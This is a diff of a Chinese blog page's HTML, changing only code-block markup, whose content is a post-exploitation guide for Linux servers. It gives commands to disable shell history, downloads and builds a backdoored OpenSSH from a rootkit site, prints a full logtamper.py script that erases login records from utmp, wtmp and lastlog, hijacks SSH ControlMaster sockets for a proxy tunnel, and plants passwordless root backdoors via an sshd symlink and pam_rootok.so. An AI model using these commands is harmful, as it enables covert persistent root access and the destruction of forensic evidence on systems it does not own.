@@ -40,7 +40,7 @@
       <p>对于SSH来说，登录主机之后先执行：
 <code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace</code></p>
 <p>然后是SSH留后门的方法<a href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>简单来说就是以下的代码：</p>
-<div class="highlight"><pre><span></span>yum install -y openssl openssl-devel pam-devel
+<div class="highlight"><pre><span></span><code>yum install -y openssl openssl-devel pam-devel
 http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
 http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
 tar zxvf openssh-5.9p1.tar.gz   
@@ -62,12 +62,12 @@ patch &lt; sshbd5.9p1.diff   //patch  后门
 ./configure --prefix<span class="o">=</span>/usr --sysconfdir<span class="o">=</span>/etc/ssh --with-pam --with-kerberos5
 make <span class="o">&amp;&amp;</span> make install 
 service sshd restart //重启sshd
-</pre></div>
+</code></pre></div>
 
 
 <p><a href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
 <p>接下来删除登录的历史记录，使用<a href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>代码复制过来：</p>
-<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python </span>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python </span>
 <span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
 <span class="kn">from</span> <span class="nn">pwd</span> <span class="kn">import</span> <span class="n">getpwnam</span>
 <span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">strptime</span><span class="p">,</span> <span class="n">mktime</span>
@@ -88,7 +88,7 @@ service sshd restart //重启sshd
     <span class="n">xtmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
-        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
             <span class="nb">bytes</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">XTMP_STRUCT_SIZE</span><span class="p">)</span>
             <span class="k">if</span> <span class="ow">not</span> <span class="nb">bytes</span><span class="p">:</span>
                 <span class="k">break</span>
@@ -127,12 +127,12 @@ service sshd restart //重启sshd
         <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
     <span class="k">finally</span><span class="p">:</span>
         <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-    <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">return</span> <span class="kc">True</span>
 
 
 <span class="k">def</span> <span class="nf">showMessage</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
-    <span class="k">print</span> <span class="n">msg</span>
-    <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="n">msg</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">saveFile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
@@ -159,10 +159,10 @@ service sshd restart //重启sshd
 
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
         <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
-            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
                 <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
                 <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">UTMPFILE</span>
 
             <span class="c1"># tamper</span>
@@ -170,10 +170,10 @@ service sshd restart //重启sshd
             <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
 
         <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;2&#39;</span><span class="p">:</span>
-            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
                 <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
                 <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">WTMPFILE</span>
 
             <span class="c1"># tamper</span>
@@ -181,10 +181,10 @@ service sshd restart //重启sshd
             <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
 
         <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;3&#39;</span><span class="p">:</span>
-            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
                 <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
                 <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">LASTLOGFILE</span>
 
             <span class="c1"># tamper</span>
@@ -192,7 +192,7 @@ service sshd restart //重启sshd
 
         <span class="k">else</span><span class="p">:</span>
             <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>====
@@ -210,11 +210,11 @@ ControlPersist yes</p>
 <ol>
 <li>直接修改~/.bashrc文件</li>
 </ol>
-<div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="p">()</span> 
+<div class="highlight"><pre><span></span><code><span class="n">ssh</span> <span class="p">()</span> 
 <span class="p">{</span> 
     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;ControlMaster=auto&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;ControlPath=/tmp/%r@%h:%p&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;ControlPersist=yes&quot;</span> <span class="s">&quot;$@&quot;</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>然后使用ssh登录的时候:</p>
@@ -222,10 +222,10 @@ ControlPersist yes</p>
 <p>===
 进阶，未测试：</p>
 <p>如果sockets文件存在，可以创建一个tunnel:</p>
-<div class="highlight"><pre><span></span><span class="n">lsof</span> <span class="o">-</span><span class="n">i</span> <span class="nl">TCP</span><span class="p">:</span><span class="mi">9090</span>
+<div class="highlight"><pre><span></span><code><span class="n">lsof</span> <span class="o">-</span><span class="n">i</span> <span class="nl">TCP</span><span class="p">:</span><span class="mi">9090</span>
 <span class="n">ssh</span> <span class="o">-</span><span class="n">O</span> <span class="n">forward</span> <span class="o">-</span><span class="n">D</span> <span class="mi">9090</span> <span class="o">-</span><span class="n">S</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">root</span><span class="mf">@112.124.20.20</span><span class="err">\</span><span class="o">:</span><span class="mi">22</span> <span class="o">%</span><span class="n">h</span>
 <span class="n">lsof</span> <span class="o">-</span><span class="n">i</span> <span class="nl">TCP</span><span class="p">:</span><span class="mi">9090</span> 
-</pre></div>
+</code></pre></div>
 
 
 <p>然后就可以使用9090端口作为socks5代理。</p>
@@ -233,9 +233,9 @@ ControlPersist yes</p>
 <ol>
 <li>检查ssh配置文件里面，是否开启ContronMaster模式</li>
 </ol>
-<div class="highlight"><pre><span></span>  <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_config</span>
-  <span class="err">$</span><span class="n">HOME</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">config</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">  /etc/ssh/ssh_config</span>
+<span class="err">  $HOME/.ssh/config</span>
+</code></pre></div>
 
 
 <ol>
@@ -245,8 +245,8 @@ ControlPersist yes</p>
 <p>========
 再更新：</p>
 <p>在linux里面有这么一句话，快速建立后门：</p>
-<div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sshd</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span> <span class="o">-</span><span class="n">oport</span><span class="o">=</span><span class="mi">12345</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span>
+</code></pre></div>
 
 
 <p>然后 <code>ssh root@xxxxx -p 12345</code>随便输入密码，即可获得root权限。</p>
@@ -262,41 +262,41 @@ ControlPersist yes</p>
 <li>ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345 失败</li>
 <li>此类ssh后门核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能，可以自己添加</li>
 </ul>
-<div class="highlight"><pre><span></span><span class="n">echo</span> <span class="ss">&quot;auth sufficient pam_rootok.so&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">hacker</span>
-<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">hacker</span>
-<span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sshd</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hacker</span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hacker</span> <span class="o">-</span><span class="n">oport</span><span class="o">=</span><span class="mi">12345</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">echo &quot;auth sufficient pam_rootok.so&quot; &gt;&gt; /etc/pam.d/hacker</span>
+<span class="err">cat /etc/pam.d/hacker</span>
+<span class="err">ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=12345</span>
+</code></pre></div>
 
 
 <p>只要文件中包含<code>auth sufficient pam_rootok.so</code>，即可无密码登录，可以在<code>/etc/pam.d</code>目录中查找这个配置:</p>
-<div class="highlight"><pre><span></span><span class="n">find</span> <span class="p">.</span><span class="o">/</span> <span class="o">|</span><span class="n">xargs</span> <span class="n">grep</span> <span class="ss">&quot;pam_rootok&quot;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">find ./ |xargs grep &quot;pam_rootok&quot;</span>
+</code></pre></div>
 
 
 <p>ubuntu 14里面如下的结果:</p>
-<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">su</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span> <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">su</span><span class="p">:</span><span class="o">#</span> <span class="n">permitted</span> <span class="n">earlier</span> <span class="k">by</span> <span class="n">e</span><span class="p">.</span><span class="k">g</span><span class="p">.</span> <span class="ss">&quot;sufficient pam_rootok.so&quot;</span><span class="p">).</span>
-<span class="p">.</span><span class="o">/</span><span class="n">chfn</span><span class="p">:</span><span class="n">auth</span>     <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">schroot</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span> <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">runuser</span><span class="p">:</span><span class="n">auth</span>      <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">chsh</span><span class="p">:</span><span class="n">auth</span>     <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">./su:auth       sufficient pam_rootok.so</span>
+<span class="err">./su:# permitted earlier by e.g. &quot;sufficient pam_rootok.so&quot;).</span>
+<span class="err">./chfn:auth     sufficient  pam_rootok.so</span>
+<span class="err">./schroot:auth       sufficient pam_rootok.so</span>
+<span class="err">./runuser:auth      sufficient  pam_rootok.so</span>
+<span class="err">./chsh:auth     sufficient  pam_rootok.so</span>
+</code></pre></div>
 
 
 <p>Centos 6.7结果如下:</p>
-<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">runuser</span><span class="p">:</span><span class="n">auth</span>      <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">config</span><span class="o">-</span><span class="n">util</span><span class="p">:</span><span class="n">auth</span>      <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">su</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">chfn</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">setup</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">xserver</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span> <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">chsh</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">poweroff</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>    <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">halt</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>    <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">wireshark</span><span class="p">:</span><span class="n">auth</span>        <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">eject</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>   <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-<span class="p">.</span><span class="o">/</span><span class="n">reboot</span><span class="p">:</span><span class="n">auth</span>       <span class="n">sufficient</span>  <span class="n">pam_rootok</span><span class="p">.</span><span class="n">so</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">./runuser:auth      sufficient  pam_rootok.so</span>
+<span class="err">./config-util:auth      sufficient  pam_rootok.so</span>
+<span class="err">./su:auth       sufficient  pam_rootok.so</span>
+<span class="err">./chfn:auth       sufficient   pam_rootok.so</span>
+<span class="err">./setup:auth       sufficient   pam_rootok.so</span>
+<span class="err">./xserver:auth       sufficient pam_rootok.so</span>
+<span class="err">./chsh:auth       sufficient   pam_rootok.so</span>
+<span class="err">./poweroff:auth       sufficient    pam_rootok.so</span>
+<span class="err">./halt:auth       sufficient    pam_rootok.so</span>
+<span class="err">./wireshark:auth        sufficient  pam_rootok.so</span>
+<span class="err">./eject:auth       sufficient   pam_rootok.so</span>
+<span class="err">./reboot:auth       sufficient  pam_rootok.so</span>
+</code></pre></div>
     </div><!-- /.entry-content -->
 
   </article>
